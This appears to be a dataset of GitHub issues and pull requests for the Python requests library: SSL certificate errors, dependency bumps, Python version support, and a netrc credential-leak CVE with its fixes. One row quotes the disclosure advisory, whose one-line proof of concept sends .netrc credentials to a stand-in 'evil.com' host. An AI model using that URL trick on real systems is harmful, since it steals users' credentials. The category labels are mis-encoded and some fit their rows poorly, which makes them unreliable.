  ""platform"": {
    ""release"": ""6.12.33"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.28.2""
  },
  ""system_ssl"": {
    ""version"": ""30300030""
  },
  ""urllib3"": {
    ""version"": ""1.26.20""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",é«˜,https://github.com/psf/requests/issues/6978
3169944908,"[Whitesource] requests-2.32.4 relys on urllib3-2.4.0, but urllib3-2.4.0 contains vulnerabilities","<!-- Summary. -->

## Expected Result

WhiteSource offical guidance recommends that we can upgrade urllib3-2.4.0 to urllib3-2.5.0

## Actual Result

<!-- What happened instead. -->



",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/issues/6977
3160495736,Vulnerabilities reported in v2.32.4,Mend is reporting two vulnerabilities in requests v2.23.4 as [CVE-2025-50181](https://www.mend.io/vulnerability-database/CVE-2025-50181) and [CVE-2025-50182](https://www.mend.io/vulnerability-database/CVE-2025-50182).,åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/issues/6976
3156800691,Will requests 2.31.0 work with python 3.12?,"I can see that requests version 2.32.0 ""officially supports Python 3.13"".
But running pip install with requests==2.31.0 succeeded. IS it safe to use with Python 3.12? ",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/issues/6975
3153964015,SSL: CERTIFICATE_VERIFY_FAILED when using custom root CA in Windows,"When accessing external HTTPS sites using requests with pip-system-certs and/or defined cacert with the entire certificate path included the following error appears in all versions of 3.13:
r = threatSession.get(baseURL + ""/auth/new"", headers=headers) #, headers = {""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36""})
File ""C:\Program Files\Python313\Lib\site-packages\requests\sessions.py"", line 602, in get
return self.request(""GET"", url, **kwargs)
~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^
File ""C:\Program Files\Python313\Lib\site-packages\requests\sessions.py"", line 589, in request
resp = self.send(prep, **send_kwargs)
File ""C:\Program Files\Python313\Lib\site-packages\requests\sessions.py"", line 703, in send
r = adapter.send(request, **kwargs)
File ""C:\Program Files\Python313\Lib\site-packages\requests\adapters.py"", line 698, in send
raise SSLError(e, request=request)
requests.exceptions.SSLError: HTTPSConnectionPool(host='threatinsight.proofpoint.com', port=443): Max retries exceeded with url: /auth/new (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Missing Authority Key Identifier (_ssl.c:1020)')))

This is working on versions <=3.12.10

## Reproduction Steps
Use Windows
Use corporate Root CA
Root CA is trusted  by Windows Cert store

Install pip-system-certs

```python
import requests
baseURL = ""www.example.com""
threatSession = requests.Session()
headers = {""Referer"":baseURL}
r = threatSession.get(baseURL, headers=headers) 
```

## System Information

    $ python -m requests.help

C:\Program Files\Python313>python -m requests.help
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.12.10""
  },
  ""platform"": {
    ""release"": ""11"",
    ""system"": ""Windows""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.4""
  },
  ""system_ssl"": {
    ""version"": ""30000100""
  },
  ""urllib3"": {
    ""version"": ""2.4.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}

C:\Program Files\Python313>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6974
3150768515,Bump github/codeql-action from 3.28.5 to 3.29.0,"Bumps [github/codeql-action](https://github.com/github/codeql-action) from 3.28.5 to 3.29.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/github/codeql-action/releases"">github/codeql-action's releases</a>.</em></p>
<blockquote>
<h2>v3.29.0</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>3.29.0 - 11 Jun 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.22.0. <a href=""https://redirect.github.com/github/codeql-action/pull/2925"">#2925</a></li>
<li>Bump minimum CodeQL bundle version to 2.16.6. <a href=""https://redirect.github.com/github/codeql-action/pull/2912"">#2912</a></li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.29.0/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.28.19</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>3.28.19 - 03 Jun 2025</h2>
<ul>
<li>The CodeQL Action no longer includes its own copy of the extractor for the <code>actions</code> language, which is currently in public preview.
The <code>actions</code> extractor has been included in the CodeQL CLI since v2.20.6. If your workflow has enabled the <code>actions</code> language <em>and</em> you have pinned
your <code>tools:</code> property to a specific version of the CodeQL CLI earlier than v2.20.6, you will need to update to at least CodeQL v2.20.6 or disable
<code>actions</code> analysis.</li>
<li>Update default CodeQL bundle version to 2.21.4. <a href=""https://redirect.github.com/github/codeql-action/pull/2910"">#2910</a></li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.28.19/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.28.18</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>3.28.18 - 16 May 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.21.3. <a href=""https://redirect.github.com/github/codeql-action/pull/2893"">#2893</a></li>
<li>Skip validating SARIF produced by CodeQL for improved performance. <a href=""https://redirect.github.com/github/codeql-action/pull/2894"">#2894</a></li>
<li>The number of threads and amount of RAM used by CodeQL can now be set via the <code>CODEQL_THREADS</code> and <code>CODEQL_RAM</code> runner environment variables. If set, these environment variables override the <code>threads</code> and <code>ram</code> inputs respectively. <a href=""https://redirect.github.com/github/codeql-action/pull/2891"">#2891</a></li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.28.18/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.28.17</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>3.28.17 - 02 May 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.21.2. <a href=""https://redirect.github.com/github/codeql-action/pull/2872"">#2872</a></li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.28.17/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/github/codeql-action/blob/main/CHANGELOG.md"">github/codeql-action's changelog</a>.</em></p>
<blockquote>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>[UNRELEASED]</h2>
<p>No user facing changes.</p>
<h2>3.29.0 - 11 Jun 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.22.0. <a href=""https://redirect.github.com/github/codeql-action/pull/2925"">#2925</a></li>
<li>Bump minimum CodeQL bundle version to 2.16.6. <a href=""https://redirect.github.com/github/codeql-action/pull/2912"">#2912</a></li>
</ul>
<h2>3.28.19 - 03 Jun 2025</h2>
<ul>
<li>The CodeQL Action no longer includes its own copy of the extractor for the <code>actions</code> language, which is currently in public preview.
The <code>actions</code> extractor has been included in the CodeQL CLI since v2.20.6. If your workflow has enabled the <code>actions</code> language <em>and</em> you have pinned
your <code>tools:</code> property to a specific version of the CodeQL CLI earlier than v2.20.6, you will need to update to at least CodeQL v2.20.6 or disable
<code>actions</code> analysis.</li>
<li>Update default CodeQL bundle version to 2.21.4. <a href=""https://redirect.github.com/github/codeql-action/pull/2910"">#2910</a></li>
</ul>
<h2>3.28.18 - 16 May 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.21.3. <a href=""https://redirect.github.com/github/codeql-action/pull/2893"">#2893</a></li>
<li>Skip validating SARIF produced by CodeQL for improved performance. <a href=""https://redirect.github.com/github/codeql-action/pull/2894"">#2894</a></li>
<li>The number of threads and amount of RAM used by CodeQL can now be set via the <code>CODEQL_THREADS</code> and <code>CODEQL_RAM</code> runner environment variables. If set, these environment variables override the <code>threads</code> and <code>ram</code> inputs respectively. <a href=""https://redirect.github.com/github/codeql-action/pull/2891"">#2891</a></li>
</ul>
<h2>3.28.17 - 02 May 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.21.2. <a href=""https://redirect.github.com/github/codeql-action/pull/2872"">#2872</a></li>
</ul>
<h2>3.28.16 - 23 Apr 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.21.1. <a href=""https://redirect.github.com/github/codeql-action/pull/2863"">#2863</a></li>
</ul>
<h2>3.28.15 - 07 Apr 2025</h2>
<ul>
<li>Fix bug where the action would fail if it tried to produce a debug artifact with more than 65535 files. <a href=""https://redirect.github.com/github/codeql-action/pull/2842"">#2842</a></li>
</ul>
<h2>3.28.14 - 07 Apr 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.21.0. <a href=""https://redirect.github.com/github/codeql-action/pull/2838"">#2838</a></li>
</ul>
<h2>3.28.13 - 24 Mar 2025</h2>
<p>No user facing changes.</p>
<h2>3.28.12 - 19 Mar 2025</h2>
<ul>
<li>Dependency caching should now cache more dependencies for Java <code>build-mode: none</code> extractions. This should speed up workflows and avoid inconsistent alerts in some cases.</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/github/codeql-action/commit/ce28f5bb42b7a9f2c824e633a3f6ee835bab6858""><code>ce28f5b</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2926"">#2926</a> from github/update-v3.29.0-e8799281c</li>
<li><a href=""https://github.com/github/codeql-action/commit/bc251b7932638a7881a8db15d1aaf0151642af99""><code>bc251b7</code></a> Update changelog for v3.29.0</li>
<li><a href=""https://github.com/github/codeql-action/commit/e8799281c8dee3b2e1aaed2c059e530fcfdc2d6d""><code>e879928</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2925"">#2925</a> from github/update-bundle/codeql-bundle-v2.22.0</li>
<li><a href=""https://github.com/github/codeql-action/commit/efd43b3097c094d883d91934155f0a32af09dff7""><code>efd43b3</code></a> Merge branch 'main' into update-bundle/codeql-bundle-v2.22.0</li>
<li><a href=""https://github.com/github/codeql-action/commit/7cb9b16051842e6c23c8b9fbcf92481f92d0644a""><code>7cb9b16</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2912"">#2912</a> from github/henrymercer/bump-minimum-codeql-2.16.6</li>
<li><a href=""https://github.com/github/codeql-action/commit/3855117ba18b27e082b12e3e92e00d1b52aaa605""><code>3855117</code></a> Add changelog note</li>
<li><a href=""https://github.com/github/codeql-action/commit/f5d4e2a7ca2a5826357748bb8743390a4775946f""><code>f5d4e2a</code></a> Update default bundle to codeql-bundle-v2.22.0</li>
<li><a href=""https://github.com/github/codeql-action/commit/22deae890c55a1dc3ffba1aa20ad4148284e72d1""><code>22deae8</code></a> Update package-lock.json</li>
<li><a href=""https://github.com/github/codeql-action/commit/df2a830ca4348a013f4804b56f41795f408f1e4e""><code>df2a830</code></a> Merge branch 'main' into henrymercer/bump-minimum-codeql-2.16.6</li>
<li><a href=""https://github.com/github/codeql-action/commit/b1e4dc3db58c9601794e22a9f6d28d45461b9dbf""><code>b1e4dc3</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2916"">#2916</a> from github/dependabot/npm_and_yarn/npm-5cdccdc43f</li>
<li>Additional commits viewable in <a href=""https://github.com/github/codeql-action/compare/f6091c0113d1dcf9b98e269ee48e8a7e51b7bdd4...ce28f5bb42b7a9f2c824e633a3f6ee835bab6858"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=github/codeql-action&package-manager=github_actions&previous-version=3.28.5&new-version=3.29.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜, æ€§èƒ½é—®é¢˜",é«˜,https://github.com/psf/requests/pull/6973
3150601109,Drop python 3.8,Its been 8 months since [python 3.8](https://endoflife.date/python) has been dead.,å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6972
3149798157,Removes simplejson,"I don't see a need to keep `simplejson` around, when `json` is builtin to python since 2.6.",å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6971
3149706672,Removes py2 code,"Removes dead code.

Originally, the I was going to remove more stuff, but decided to move it to it's own [PR](https://github.com/psf/requests/pull/6971).",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/pull/6970
3140908591,Hostname mismatch with self signed cert on localhost,"<!-- Summary. -->

I'm running web server over SSL on localhost, using a certificate generated with openssl.

```
openssl req -x509 -newkey rsa:4096 -nodes -out ssl/cert.pem -keyout ssl/key.pem -days 365
....
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:localhost
Email Address []:
```

I can verify this certificate is correctly configured by using `curl`.

```
$ curl https://localhost:5000 --cacert ssl/cert.pem                              
OK%                                                                             
```

## Expected Result

<!-- What you expected. -->

When I make a similar request using the `requests` module, I would expect the request to succeed.

```python
>>> import requests
>>> r = requests.get(""https://localhost:5000"", verify=""./ssl/cert.pem"")
>>> assert r.text == ""OK""
```

## Actual Result

<!-- What happened instead. -->
```python
>>> import requests
>>> requests.get(""https://localhost:5000"", verify=""./ssl/cert.pem"")
Traceback (most recent call last):
  File ""/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py"", line 464, in _make_request
    self._validate_conn(conn)
  File ""/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py"", line 1093, in _validate_conn
    conn.connect()
  File ""/my-project/.venv/lib/python3.12/site-packages/urllib3/connection.py"", line 741, in connect
    sock_and_verified = _ssl_wrap_socket_and_match_hostname(
                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/my-project/.venv/lib/python3.12/site-packages/urllib3/connection.py"", line 920, in _ssl_wrap_socket_and_match_hostname
    ssl_sock = ssl_wrap_socket(
               ^^^^^^^^^^^^^^^^
  File ""/my-project/.venv/lib/python3.12/site-packages/urllib3/util/ssl_.py"", line 480, in ssl_wrap_socket
    ssl_sock = _ssl_wrap_socket_impl(sock, context, tls_in_tls, server_hostname)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/my-project/.venv/lib/python3.12/site-packages/urllib3/util/ssl_.py"", line 524, in _ssl_wrap_socket_impl
    return ssl_context.wrap_socket(sock, server_hostname=server_hostname)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/.pyenv/versions/3.12.8/lib/python3.12/ssl.py"", line 455, in wrap_socket
    return self.sslsocket_class._create(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/.pyenv/versions/3.12.8/lib/python3.12/ssl.py"", line 1041, in _create
    self.do_handshake()
  File ""/home/.pyenv/versions/3.12.8/lib/python3.12/ssl.py"", line 1319, in do_handshake
    self._sslobj.do_handshake()
ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py"", line 787, in urlopen
    response = self._make_request(
               ^^^^^^^^^^^^^^^^^^^
  File ""/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py"", line 488, in _make_request
    raise new_e
urllib3.exceptions.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/my-project/.venv/lib/python3.12/site-packages/requests/adapters.py"", line 668, in send
    resp = conn.urlopen(
           ^^^^^^^^^^^^^
  File ""/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py"", line 841, in urlopen
    retries = retries.increment(
              ^^^^^^^^^^^^^^^^^^
  File ""/my-project/.venv/lib/python3.12/site-packages/urllib3/util/retry.py"", line 519, in increment
    raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='localhost', port=5000): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, ""[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)"")))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/my-project/.venv/lib/python3.12/site-packages/requests/api.py"", line 73, in get
    return request(""get"", url, params=params, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/my-project/.venv/lib/python3.12/site-packages/requests/api.py"", line 59, in request
    return session.request(method=method, url=url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/my-project/.venv/lib/python3.12/site-packages/requests/sessions.py"", line 589, in request
    resp = self.send(prep, **send_kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/my-project/.venv/lib/python3.12/site-packages/requests/sessions.py"", line 703, in send
    r = adapter.send(request, **kwargs)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/my-project/.venv/lib/python3.12/site-packages/requests/adapters.py"", line 699, in send
    raise SSLError(e, request=request)
requests.exceptions.SSLError: HTTPSConnectionPool(host='localhost', port=5000): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, ""[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)"")))
```

## Reproduction Steps

1. Create a new cert and key

```
openssl req -x509 -newkey rsa:4096 -nodes -out ssl/cert.pem -keyout ssl/key.pem -days 365
....
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:localhost
Email Address []:
```

2. Run a web server that uses the key. Here's a simple flask application you can use.

```python
# app.py
from flask import Flask

app = Flask(__name__)

@app.route(""/"")
def index():
    return ""OK""
```

Run the application with:
```
flask run --cert ssl/cert.pem --key ssl/key.pem
```

3. Attempt to make a request

```python
import requests
requests.get(""https://localhost:5000"", verify=""./ssl/cert.pem"")
```


## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.2""
  },
  ""cryptography"": {
    ""version"": ""45.0.4""
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.12.8""
  },
  ""platform"": {
    ""release"": ""24.5.0"",
    ""system"": ""Darwin""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30500000"",
    ""version"": ""25.1.0""
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30400010""
  },
  ""urllib3"": {
    ""version"": ""2.4.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6969
3131935781,Add Trusted Publishing Release Workflow,"Rather than rely on manual releases from a developer laptop, let's use tag pushes to trigger a workflow to publish artifacts to PyPI. This will leverage trusted publishing and upload attestations as well.",å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6968
3131382148,Can't update to newest release,"I'm trying to update to the newest release (2.32.4), but keep getting a message that I'm already up to date.

## Expected Result

Successfully update to v2.32.4

## Actual Result

Am told that v2.32.3 is the latest release.

## Reproduction Steps

```
py -m pip install requests
WARNING: Ignoring invalid distribution -ip (d:\programs\python\python310\lib\site-packages)
Requirement already satisfied: requests in d:\programs\python\python310\lib\site-packages (2.32.3)
Requirement already satisfied: charset-normalizer<4,>=2 in d:\programs\python\python310\lib\site-packages (from requests) (3.4.1)
Requirement already satisfied: idna<4,>=2.5 in d:\programs\python\python310\lib\site-packages (from requests) (3.10)
Requirement already satisfied: urllib3<3,>=1.21.1 in d:\programs\python\python310\lib\site-packages (from requests) (2.4.0)
Requirement already satisfied: certifi>=2017.4.17 in d:\programs\python\python310\lib\site-packages (from requests) (2025.4.26)
WARNING: Ignoring invalid distribution -ip (d:\programs\python\python310\lib\site-packages)
WARNING: Ignoring invalid distribution -ip (d:\programs\python\python310\lib\site-packages)
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.10.0""
  },
  ""platform"": {
    ""release"": ""10"",
    ""system"": ""Windows""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""101010cf""
  },
  ""urllib3"": {
    ""version"": ""2.4.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/issues/6967
3130635903,Bump version and add release notes for v2.32.4,,å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6966
3118164133,Only use hostname to do netrc lookup instead of netloc,Applies the patch generated from the GHSA which we couldn't merge as no one on the team had sufficient permissions.,å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6965
3117600699,CVE-2024-47081: Netrc credential leak in PSF requests library,"There does not yet seem to be an issue nor an advisory about CVE-2024-47081 which was recently disclosed on seclists.org - I'm thus copying the advisory here:

```
From: Juho ForsÃ©n via Fulldisclosure <fulldisclosure () seclists org>
Date: Sat, 31 May 2025 06:30:50 +0000
The PSF requests library (https://github.com/psf/requests & https://pypi.org/project/requests/) leaks .netrc 
credentials to third parties due to incorrect URL processing under specific conditions.

Issuing the following API call triggers the vulnerability:

  requests.get('[http://example.com:@evil.com/&apos](http://example.com@evil.com/&apos);)

Assuming .netrc credentials are configured for example.com, they are leaked to evil.com by the call.

The root cause is 
https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245

The vulnerability was originally reported to the library maintainers on September 12, 2024, but no fix is available. 
CVE-2024-47081 has been reserved by GitHub for this issue.

As a workaround, clients may explicitly specify the credentials used on every API call to disable .netrc access.
```
Link: https://seclists.org/fulldisclosure/2025/Jun/2","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6964
3117413449,fix CVE 2024 47081: manual url parsing leads to netloc credentials leak,"https://seclists.org/fulldisclosure/2025/Jun/2

Honestly I have no idea why this lib used `netloc` + manual parsing instead of `hostname` as I can see references to `hostname` as early as from [the python 2.6 docs](https://docs.python.org/2.6/library/urlparse.html).","Bugåé¦ˆ, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6963
3117366854,test: Add new test to check netrc auth leak,"This patch uses the ""hostname"" attribute from the parsed url to get the host, instead of trying to calculate the host from netloc that can produce errors when ""http://username:password@domain.com"" format is used.

This should fix the security issue reported here: [CVE-2024-47081: Netrc credential leak in PSF requests library](
https://seclists.org/oss-sec/2025/q2/204)","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6962
3114387592,Fix type in README,,"Bugåé¦ˆ, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6961
3111747867,docs: clarify Quickstart POST example (fixes #6949),"Remove the line that says r1.text == r2.text == True and add a note about X-Amzn-Trace-Id, showing how to compare r1.json()['form'] instead.","Bugåé¦ˆ, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6960
3103121851,Vulnerability identified with 2.32.3,"Hi Team,

We have a vulnerability identidied with version v2.32.3, linked to CVE-2014-1830 and CVE-2015-2296. Kindly have it addressed.

Regards,
Ravi",å…¶ä»–,ä¸­,https://github.com/psf/requests/issues/6957
3099420365,"Urgent Help Required - ""Remote end closed connection without response"" error while using python Python 3.5.2 and request module 2.11.1","This is an urgent request. We are currently using Python 3.5.2 and the requests module version 2.11.1. We are encountering the following error:

Remote end closed connection without response

We are aware that this issue can typically be resolved by implementing a retry mechanism. However, our question is:

Is there any version of the requests module that handles retries automatically, without requiring us to manually implement retry logic?

If newer versions of the requests module have introduced built-in automatic retry handling, could you please let us know which version includes this feature?

Your assistance would be greatly appreciated.


","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",é«˜,https://github.com/psf/requests/issues/6956
3095894846,Fix #6917: Correct Content-Length for io.StringIO with multi-byte UTF-8,"Fixes #6917

This PR resolves the incorrect `Content-Length` calculation when using `io.StringIO` as the request body. Key changes:

1. Added special handling for `io.StringIO` in the `super_len` function
2. Calculates the correct byte length by encoding content as UTF-8
3. Added test cases to validate the fix

Test results:
- `Content-Length` now accurately reflects byte count for `io.StringIO` with multi-byte characters
- All existing tests remain passing","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",é«˜,https://github.com/psf/requests/pull/6955
3089003699,class HeaderDict(rest_requests.packages.urllib3._collections.HTTPHeaderDict): AttributeError: module 'requests' has no attribute 'packages',"> fix released in 2.17.2! 

 _Originally posted by @kennethreitz in [#4104](https://github.com/psf/requests/issues/4104#issuecomment-304734015)_

Im using requests 2.32.3 with djangorestframework 3.16.0 but im still having the same problem: This [commit](https://github.com/requests/requests/commit/588e8f7f640f774e71d61b53ccb34d310172e0ad) seems to have broken requests.packages.

 from rest_framework.test import APITestCase
<frozen importlib._bootstrap>:1360: in _find_and_load
    ???
<frozen importlib._bootstrap>:1331: in _find_and_load_unlocked
    ???
<frozen importlib._bootstrap>:935: in _load_unlocked
    ???
..\.venv\Lib\site-packages\_pytest\assertion\rewrite.py:185: in exec_module
    exec(co, module.__dict__)
..\.venv\Lib\site-packages\rest_framework\test.py:27: in <module>
    class HeaderDict(rest_requests.packages.urllib3._collections.HTTPHeaderDict):
AttributeError: module 'requests' has no attribute 'packages'
ERROR users/tests.py - AttributeError: module 'requests' has no attribute 'packages'

Somebody please help me","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6954
